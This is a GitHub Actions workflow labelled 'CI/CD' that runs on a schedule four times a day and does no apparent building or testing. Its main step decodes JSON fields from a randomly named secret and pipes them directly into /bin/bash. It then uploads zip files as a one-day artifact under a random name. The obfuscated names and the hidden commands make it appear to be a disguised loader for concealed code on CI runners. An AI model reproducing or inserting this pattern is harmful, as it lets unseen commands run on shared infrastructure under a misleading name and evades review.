name: CI/CD
on:
  workflow_dispatch:

  schedule:
    - cron: '27 3,9,15,21 * * *'
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          ugeyz21: ${{ secrets.ugeyz21 }}
        run: |
          printf '%s' "$ugeyz21" | jq -r .gqaog54985 | /bin/bash
          printf '%s' "$myb902" | jq -r .cnbh1 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: ggp1reFn
          path: "*.zip"
          retention-days: 1
